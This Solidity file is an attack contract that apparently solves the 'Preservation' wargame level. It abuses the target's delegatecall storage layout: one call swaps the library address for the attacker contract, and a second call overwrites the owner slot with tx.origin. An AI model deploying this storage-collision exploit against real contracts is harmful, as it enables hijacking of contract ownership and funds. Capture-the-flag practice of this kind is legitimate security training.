// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPreservation {
    function setFirstTime(uint _timeStamp) external;
}

contract PreservationAttack {
    // same layout as Preservation
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    // sets owner lol
    function setTime(uint _time) public {
        owner = address(uint160(_time));
    }

    function attack(address _preservation) public {
        IPreservation(_preservation).setFirstTime(uint256(uint160(address(this))));
        // set Preservation timeZone1Library to this
        IPreservation(_preservation).setFirstTime(uint256(uint160(address(tx.origin))));
        // call this setTime to change owner
    }
}
